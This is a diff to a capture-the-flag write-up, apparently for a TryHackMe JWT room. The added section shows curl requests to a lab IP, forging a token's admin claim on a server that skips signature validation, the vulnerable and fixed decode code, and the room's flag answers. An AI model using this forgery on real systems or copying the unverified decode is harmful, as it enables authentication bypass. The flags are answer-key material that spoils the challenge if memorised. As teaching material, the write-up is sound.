@@ -55,7 +55,7 @@ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "pas
 
   ![image](https://github.com/user-attachments/assets/fa8a621f-55f2-47cf-b3be-6638fdbbfa35)
 
-**Vulnerable**
+**Vulnerable Code**
 - This is how the vulnerable code looks like
 
 ```bash
@@ -84,4 +84,47 @@ flag = self.db_lookup(username, "flag")
 -> `THM{9cc039cc-d85f-45d1-ac3b-818c8383a560}`
 
 ## Signature Validation Mistakes
+### No Signature validation
+- If the server does not verify the JWT, attackers can easily modify those JWT.
+
+**Demonstration**
+- Retrieve the token
+```bash
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.10.53.116/api/v1.0/example2
+```
+![image](https://github.com/user-attachments/assets/6499a839-2876-48e0-8b50-6fb0436641c6)
+
+- Verify the user
+```bash
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4' http://10.10.53.116/api/v1.0/example2?username=user
+```
+- NOtice that if we omit the last part of the token, i.e **`UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4`**, we can still verify the user.
+
+  ![image](https://github.com/user-attachments/assets/1fad3216-7b39-49b1-b288-34153220016c)
+
+- From the above screenshot, we saw that the first command verifies the username with the full token. The second command omits the last part and still gets the same result. Now we can confirm that this JWT does not validate signature.
+
+**Vulnerable Code**
+```bash
+payload = jwt.decode(token, opptions={'verify_signature': False})
+```
+
+**The Fix**
+The JWT should always be verified before performing any other actions.
+```bash
+payload = jwt.decode(token, self.secret, algorithms = "HS256")
+```
+
+### ANSWER THE QUESTIONS
+- **What is the flag for example 2?**
+Paste the user's token to [JWT.io](https://jwt.io/), we see the user is not an admin.
+
+![image](https://github.com/user-attachments/assets/1e9ed228-1352-4f22-9cac-b1fda8983453)
+
+Since the JWT does not validate signature, we can just change the claim to **`{ "username" : "admin", "admin" : 1 }`**. Notice the token on the left handside changes. Copy that new token value and use it to verify the user again.
+
+![image](https://github.com/user-attachments/assets/910455df-34d5-470b-9239-5f45ee7335a3)
+
+-> `THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}`
+
 
